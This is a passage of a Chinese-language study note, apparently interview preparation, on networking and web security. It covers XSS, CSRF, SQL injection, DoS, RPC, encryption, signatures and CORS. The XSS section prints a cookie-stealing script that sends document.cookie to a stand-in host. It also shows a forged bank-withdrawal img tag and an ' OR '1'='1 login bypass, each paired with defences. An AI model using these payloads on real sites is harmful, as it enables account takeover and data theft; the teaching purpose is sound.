<td align="left">初始化向量，运用于分组对称加密</td>
</tr>
</tbody></table>
<p>然后在后续的交互中就使用 session Key 和 MAC 算法的秘钥对传输的内容进行加密和解密。</p>
<p>具体的步骤是先使用 MAC 秘钥对内容进行摘要，然后把摘要放在内容的后面使用 sessionKey 再进行加密。对于客户端发送的数据，服务器端收到之后，需要先使用 <code>client_write_key</code> 进行解密，然后使用 <code>client_write_MAC_key</code> 对数据完整性进行验证。服务器端发送的数据，客户端会使用 <code>server_write_key</code> 和 <code>server_write_MAC_key</code> 进行相同的操作。</p>
<h1 id="20-网络攻击手段有哪些？"><a href="#20-网络攻击手段有哪些？" class="headerlink" title="20. 网络攻击手段有哪些？"></a>20. 网络攻击手段有哪些？</h1><h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;location.href&#x3D;&quot;&#x2F;&#x2F;domain.com&#x2F;?c&#x3D;&quot; + document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>之后该内容可能会被渲染成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;location.href&#x3D;&quot;&#x2F;&#x2F;domain.com&#x2F;?c&#x3D;&quot; + document.cookie&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>

<p>另一个用户浏览了含有这个内容的页面将会跳转到 <code>domain.com</code> 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
<li>窃取用户的 Cookie</li>
<li>伪造虚假的输入表单骗取个人信息</li>
<li>显示伪造的文章或者图片</li>
</ul>
<h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><ol>
<li>设置 Cookie 为 <code>HttpOnly</code>: 设置了 <code>HttpOnly</code> 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 <code>document.cookie</code> 获取用户 Cookie 信息。</li>
<li>过滤特殊字符: 例如将 <code>&lt;</code> 转义为 <code>&lt;</code>，将 <code>&gt;</code> 转义为 <code>&gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</li>
</ol>
<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;XSS Demo&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;<span class="number">123</span>&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;q&quot;</span> value=<span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;hello&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">alert(<span class="regexp">/xss/</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;h1&gt;XSS Demo&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;<span class="number">123</span>&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&amp;lt;form&amp;gt;</span><br><span class="line">  &amp;lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;q&quot;</span> value=<span class="string">&quot;test&quot;</span>&amp;gt;</span><br><span class="line">&amp;lt;/form&amp;gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;hello&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&amp;lt;script type=<span class="string">&quot;text/javascript&quot;</span>&amp;gt;</span><br><span class="line">alert(<span class="regexp">/xss/</span>);</span><br><span class="line">&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>

<h2 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
<h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理:"></a>攻击原理:</h3><p>假如一家银行用以执行转账操作的 URL 地址如下： <code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code>。<br>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.examplebank.com&#x2F;withdraw?account&#x3D;Alice&amp;amount&#x3D;1000&amp;for&#x3D;Badman&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<h3 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h4><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<h4 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h4><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
<h4 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h4><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
<h3 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strSQL &#x3D; &quot;SELECT * FROM users WHERE (name &#x3D; &#39;&quot; + userName + &quot;&#39;) and (pw &#x3D; &#39;&quot;+ passWord +&quot;&#39;);&quot;</span><br></pre></td></tr></table></figure>

<p>如果填入以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userName &#x3D; &quot;1&#39; OR &#39;1&#39;&#x3D;&#39;1&quot;;</span><br><span class="line">passWord &#x3D; &quot;1&#39; OR &#39;1&#39;&#x3D;&#39;1&quot;;</span><br></pre></td></tr></table></figure>

<p>那么 SQL 查询字符串为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strSQL &#x3D; &quot;SELECT * FROM users WHERE (name &#x3D; &#39;1&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;) and (pw &#x3D; &#39;1&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;);&quot;</span><br></pre></td></tr></table></figure>

<p>此时无需验证通过就能执行以下查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strSQL &#x3D; &quot;SELECT * FROM users;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h4><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PreparedStatement stmt &#x3D; connection.prepareStatement(&quot;SELECT * FROM users WHERE userid&#x3D;? AND password&#x3D;?&quot;);</span><br><span class="line">stmt.setString(1, userid);</span><br><span class="line">stmt.setString(2, password);</span><br><span class="line">ResultSet rs &#x3D; stmt.executeQuery();</span><br></pre></td></tr></table></figure>

<h4 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h4><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
<h2 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
<h1 id="21-HTTP和RPC区别？（服务之间的调用为啥不直接用-HTTP-而用-RPC？）"><a href="#21-HTTP和RPC区别？（服务之间的调用为啥不直接用-HTTP-而用-RPC？）" class="headerlink" title="21. HTTP和RPC区别？（服务之间的调用为啥不直接用 HTTP 而用 RPC？）"></a>21. HTTP和RPC区别？（服务之间的调用为啥不直接用 HTTP 而用 RPC？）</h1><p>RPC（Remote Procedure Call）—远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。比如两个不同的服务 A、B 部署在两台不同的机器上，那么服务 A 如果想要调用服务 B 中的某个方法该怎么办呢？使用 HTTP请求当然可以，但是可能会比较慢而且一些优化做的并不好。 RPC 的出现就是为了解决这个问题。</p>
<p><strong>RPC 原理</strong>：</p>
<p><img src="https://qiniu.xiaoming.net.cn/RPC%E5%8E%9F%E7%90%86.jpeg" alt="RPC原理"></p>
<ol>
<li>服务消费方（client）调用以本地调用方式调用服务；</li>
<li>client stub接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；</li>
<li>client stub找到服务地址，并将消息发送到服务端；</li>
<li>server stub收到消息后进行解码；</li>
<li>server stub根据解码结果调用本地的服务；</li>
<li>本地服务执行并将结果返回给server stub；</li>
<li>server stub将返回结果打包成消息并发送至消费方；</li>
<li>client stub接收到消息，并进行解码；</li>
<li>服务消费方得到最终结果。</li>
</ol>
<p><img src="https://qiniu.xiaoming.net.cn/RPC%E6%97%B6%E5%BA%8F%E5%9B%BE.jpeg" alt="RPC时序图"></p>
<p>RPC主要解决的问题：<strong>让分布式或者微服务系统中不同服务之间的调用像本地调用一样简单。</strong></p>
<p>RPC 只是一种概念、一种设计，就是为了解决不同服务之间的调用问题,它一般会包含有<strong>传输协议</strong>和<strong>序列化协议</strong>这两个。</p>
<p>实现 RPC 的传输协议可以直接建立在 TCP 之上，也可以建立在 HTTP 协议之上。大部分 RPC 框架都是使用的 TCP 连接（gRPC使用了HTTP2）。</p>
<blockquote>
<p>通常谈计算机网络的五层协议的体系结构是指：应用层、传输层、网络层、数据链路层、物理层。<br><strong>应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用</strong>。HTTP 属于应用层协议，它会基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过 URL 向HTTP服务端即 WEB 服务器发送所有请求。Web 服务器根据接收到的请求后，向客户端发送响应信息。HTTP协议建立在 TCP 协议之上。<br>运输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。TCP是传输层协议，主要解决数据如何在网络中传输。相比于UDP,TCP 提供的是面向连接的，可靠的数据传输服务。</p>
</blockquote>
<p>RPC 和 HTTP 主要关键区别就在 <strong>HTTP 使用的 TCP 协议，和 RPC 自定义的 TCP 协议在报文上的区别</strong>。</p>
<p>http1.1协议的 TCP 报文包含太多在传输过程中可能无用的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK </span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>使用自定义 TCP 协议进行传输就会避免上面这个问题，极大地减轻了传输数据的开销。 这也就是为什么通常会采用自定义 TCP 协议的 RPC 来进行进行服务调用的真正原因。除此之外，成熟的 RPC 框架还提供好了“服务自动注册与发现”、“智能负载均衡”、“可视化的服务治理和运维”、“运行期流量调度”等等功能，这些也算是选择 RPC 进行服务注册和发现的一方面原因。</p>
<h1 id="22-对称加密与非对称加密"><a href="#22-对称加密与非对称加密" class="headerlink" title="22. 对称加密与非对称加密"></a>22. 对称加密与非对称加密</h1><h2 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h2><p><strong>对称加密</strong>：A与 B 之间之间的通讯数据都用同一套的密钥来进行加密解密。</p>
<p>优点：</p>
<ul>
<li>简单快捷，密钥较短，且破译困难。</li>
</ul>
<p>缺点：</p>
<ul>
<li>如果用户一旦多的话，管理密钥也是一种困难。不方便直接沟通的两个用户之间怎么确定密钥也需要考虑，这其中就会有密钥泄露的风险，以及存在更换密钥的需求。</li>
</ul>
<p>对称加密通常有 DES,IDEA,3DES 加密算法。</p>
<p><strong>非对称加密</strong>：用公钥和私钥来加解密的算法。打个比方，A 的公钥加密过的东西只能通过 A 的私钥来解密；同理，A 的私钥加密过的东西只能通过 A 的公钥来解密。顾名思义，公钥是公开的，别人可以获取的到；私钥是私有的，只能自己拥有。</p>
<p>缺点：</p>
<ul>
<li>加解密比对称加密耗时.</li>
</ul>
<p>优点：</p>
<ul>
<li>比对称加密安全.</li>
</ul>
<p>但是非对称加密也是存在漏洞，因为公钥是公开的，如果有 C 冒充 B 的身份利用 A 的公钥给 A 发消息，这样就乱套了，所以接下来就采用<strong>非对称加密+摘要算法+数字签名</strong>的机制来确保传输安全。</p>
<p>常见的非对称加密算法有：RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p>
<h2 id="Hash算法（摘要算法）"><a href="#Hash算法（摘要算法）" class="headerlink" title="Hash算法（摘要算法）"></a>Hash算法（摘要算法）</h2><p>Hash 算法的特点是单向不可还原，用户可以通过 hash 算法对目标信息生成一段特定长度的唯一 hash 值，却不能通过这个 hash 值重新获得目标信息。因此 Hash 算法常用在不可还原的密码存储、信息完整性校验等。只要源数据不同，算法得到的摘要必定不同。</p>
<p>常见的 Hash 算法有 MD2、MD4、MD5、HAVAL、SHA</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名用来，保证信息传输的完整性、发送者的身份认证、防止交易中的抵赖发生。<br>数字签名是 A 将原始明文通过 hash 算法得到摘要，这个摘要是不可逆的；将明文加密，连同摘要加密后一起发送给 B；B 接收到后解密，得到这个摘要 a 和加密的明文，再将加密明文解密得到原始明文，然后通过同一 hash 算法得到新的摘要 b，比较 a 与 b 就可得知在传输过程中是否被更改过。</p>
<p>因此数字签名能够验证信息的完整性。如果中途数据被纂改或者丢失。那么对方就可以根据数字签名来辨别是否是来自对方的第一手信息数据。</p>
<h2 id="完整的非对称加密过程"><a href="#完整的非对称加密过程" class="headerlink" title="完整的非对称加密过程"></a>完整的非对称加密过程</h2><p>假如现在你向支付宝转账（术语数据信息），为了保证信息传送的保密性、真实性、完整性和不可否认性，需要对传送的信息进行数字加密和签名，其传送过程为：</p>
<ol>
<li>首先你要确认是否是支付宝的数字证书，如果确认为支付宝身份后，则对方真实可信。可以向对方传送信息，</li>
<li>你准备好要传送的数字信息（明文）计算要转的多少钱，对方支付宝账号等；</li>
<li>你对数字信息进行哈希运算，得到一个信息摘要（客户端主要职责）；</li>
<li>你用自己的私钥对信息摘要进行加密得到你的数字签名，并将其附在数字信息上；</li>
<li>你随机产生一个加密密钥，并用此密码对要发送的信息进行加密（密文）；</li>
<li>你用支付宝的公钥对刚才随机产生的加密密钥进行加密，将加密后的 DES 密钥连同密文一起传送给支付宝；</li>
<li>支付宝收到你传送来的密文和加密过的 DES 密钥，先用自己的私钥对加密的 DES 密钥进行解密，得到你随机产生的加密密钥；</li>
<li>支付宝然后用随机密钥对收到的密文进行解密，得到明文的数字信息，然后将随机密钥抛弃；</li>
<li>支付宝用你的公钥对你的的数字签名进行解密，得到信息摘要；</li>
<li>支付宝用相同的哈希算法对收到的明文再进行一次哈希运算，得到一个新的信息摘要；</li>
<li>支付宝将收到的信息摘要和新产生的信息摘要进行比较，如果一致，说明收到的信息没有被修改过。</li>
<li>确定收到信息，然后进行向对方进行付款交易，一次非对称密过程结束。在这后面的流程就不属于本次非对称加密的范畴，算支付宝个人的自我流程，也就是循环以上过程。</li>
</ol>
<h1 id="23-跨域问题"><a href="#23-跨域问题" class="headerlink" title="23. 跨域问题"></a>23. 跨域问题</h1><p>CORS 全称 Cross-Origin Resource Sharing，意为跨域资源共享。当一个资源去访问另一个不同域名或者同域名不同端口的资源时，就会发出跨域请求。如果此时另一个资源不允许其进行跨域资源访问，那么访问的那个资源就会遇到跨域问题。</p>
<h2 id="跨域问题出现的原因"><a href="#跨域问题出现的原因" class="headerlink" title="跨域问题出现的原因"></a>跨域问题出现的原因</h2><p>之所以会出现跨域问题，是因为浏览器采用的同源策略。</p>
<p>同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。</p>
<p>如果两个页面的<strong>协议、端口（如果有指定）和主机</strong>都相同，则两个页面具有相同的源。也可以把它称为<code>协议/主机/端口 tuple</code>，或简单地叫做 “tuple”. (“tuple” ，“元”，是指一些事物组合在一起形成一个整体，比如（1，2）叫二元，（1，2，3）叫三元)。</p>
<p>它的核心就在于它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。</p>
<p>同源策略又分为以下两种：</p>
<ul>
<li>DOM 同源策略：禁止对不同源页面 DOM 进行操作（HTML的标签元素就是DOM的元素节点，它提供了一份文档的结构）。这里主要场景是 <code>iframe</code> 跨域的情况，不同域名的 <code>iframe</code> 是限制互相访问的(<code>iframe</code> 标签规定一个内联框架,一个内联框架被用来在当前 HTML 文档中嵌入另一个文档）。</li>
<li><code>XMLHttpRequest</code> 同源策略：禁止使用 XHR 对象向不同源的服务器地址发起 HTTP 请求。</li>
</ul>
<p>同源策略控制了不同源之间的交互，例如在使用 <code>XMLHttpRequest</code> 或 <code>&lt;img&gt;</code> 标签时则会受到同源策略的约束。这些交互通常分为三类：</p>
<ul>
<li>通常允许跨域写操作（Cross-origin writes）。例如链接（links），重定向以及表单提交。特定少数的HTTP请求需要添加 <code>preflight</code>。</li>
<li>通常允许跨域资源嵌入（Cross-origin embedding）。</li>
<li>通常不允许跨域读操作（Cross-origin reads）。但常可以通过内嵌资源来巧妙的进行读取访问。例如可以通过读取嵌入图片的高度和宽度，调用内嵌脚本等方法。</li>
</ul>
<h3 id="为什么使用同源政策"><a href="#为什么使用同源政策" class="headerlink" title="为什么使用同源政策"></a>为什么使用同源政策</h3><p>如果没有 DOM 同源策略，也就是说不同域的 <code>iframe</code> 之间可以相互访问，那么黑客可以这样进行攻击：</p>
<p>做一个假网站，里面用 <code>iframe</code> 嵌套一个银行网站 <code>http://mybank.com</code>。</p>
<p>把 <code>iframe</code> 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。<br>这时如果用户输入账号密码，我们的主网站可以跨域访问到 <code>http://mybank.com</code> 的 <code>dom</code> 节点，就可以拿到用户的账户密码了。</p>
<p>如果没有 <code>XMLHttpRequest</code> 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：</p>
<p>用户登录了自己的银行页面 <code>http://mybank.com</code>，<code>http://mybank.com</code> 向用户的 <code>cookie</code> 中添加用户标识。</p>
<p>用户浏览了恶意页面 <code>http://evil.com</code>，执行了页面中的恶意 AJAX 请求代码。</p>
<p><code>http://evil.com</code> 向 <code>http://mybank.com</code> 发起 AJAX HTTP 请求，请求会默认把 <code>http://mybank.com</code> 对应 cookie 也同时发送过去。</p>
<p>银行页面从发送的 <code>cookie</code> 中提取用户标识，验证用户无误，<code>response</code> 中返回请求数据。此时数据就泄露了。</p>
<p>而且由于 Ajax 在后台执行，用户无法感知这一过程。</p>
<p>因此，有了浏览器同源策略，才能更安全的上网。</p>
<blockquote>
<p>同源策略确实能规避一些危险，不是说有了同源策略就安全，只是说同源策略是一种浏览器最基本的安全机制，毕竟能提高一点攻击的成本。其实没有刺不穿的盾，只是攻击的成本和攻击成功后获得的利益成不成正比。</p>
</blockquote>
<h2 id="跨域解决方法"><a href="#跨域解决方法" class="headerlink" title="跨域解决方法"></a>跨域解决方法</h2><h3 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h3><p>CORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
<p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。<br>只要同时满足以下两大条件，就属于简单请求。</p>
<p>请求方法是以下三种方法之一：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br></pre></td></tr></table></figure>

<p>HTTP的头信息不超出以下几种字段：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain</span><br></pre></td></tr></table></figure>

<p>凡是不同时满足上面两个条件，就属于非简单请求。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p>对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个 <code>Origin</code> 字段(<code>Origin</code> 字段用来说明，本次请求来自哪个源 <code>协议 + 域名 + 端口</code>。服务器根据这个值，决定是否同意这次请求）。</p>
<p>如果 Origin 指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 <code>Access-Control-Allow-Origin</code> 字段（详见下文），就知道出错了，从而抛出一个错误，被 <code>XMLHttpRequest</code> 的 <code>onerror</code> 回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以 <code>Access-Control-</code> 开头。</p>
<ul>
<li><code>Access-Control-Allow-Origin</code>：该字段是必须的。它的值要么是请求时 <code>Origin</code> 字段的值，要么是一个 <code>*</code>，表示接受任意域名的请求。</li>
<li><code>Access-Control-Allow-Credentials</code>：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器，同时 ajax 请求需要设置 <code>xhr</code> 的属性 <code>withCredentials</code> 为 true，否则，即使服务器同意发送 Cookie，浏览器也不会发送。这个值也只能设为 true，如果服务器不要浏览器发送 Cookie，删除该字段即可。</li>
<li><code>Access-Control-Expose-Headers</code>：该字段可选。CORS 请求时，XMLHttpRequest 对象的<code>getResponseHeader()</code> 方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code> 里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回 <code>FooBar</code> 字段的值。</li>
</ul>
<h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>浏览器在发送真正的请求之前，会先发送一个预检请求给服务器，浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest请求，否则就报错。这种请求使用 <code>OPTIONS</code> 方法，发送下列头部：</p>
<ul>
<li><code>Origin</code>：与简单的请求相同。</li>
<li><code>Access-Control-Request-Method</code>: 该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些HTTP方法。</li>
<li><code>Access-Control-Request-Headers</code>: （可选）该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段。</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Origin: http:&#x2F;&#x2F;www.laixiangran.cn</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: NCZ</span><br></pre></td></tr></table></figure>

<p>服务器收到 “预检” 请求以后，检查了 <code>Origin</code>、<code>Access-Control-Request-Method</code> 和<code>Access-Control-Request-Headers</code> 字段以后，确认允许跨源请求，就可以做出回应。</p>
<p>HTTP 回应中，关键的是 <code>Access-Control-Allow-Origin</code> 字段，表示 <code>http://api.bob.com</code> 可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<ul>
<li><p><code>Access-Control-Allow-Origin: *</code>：如果浏览器否定了”预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest cannot load http:<span class="comment">//api.alice.com.</span></span><br><span class="line">  Origin http:<span class="comment">//api.bob.com is not allowed by Access-Control-Allow-Origin.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">服务器回应的其他CORS相关字段如下。</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;js</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Access-Control-Allow-Methods</code>：该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p>
</li>
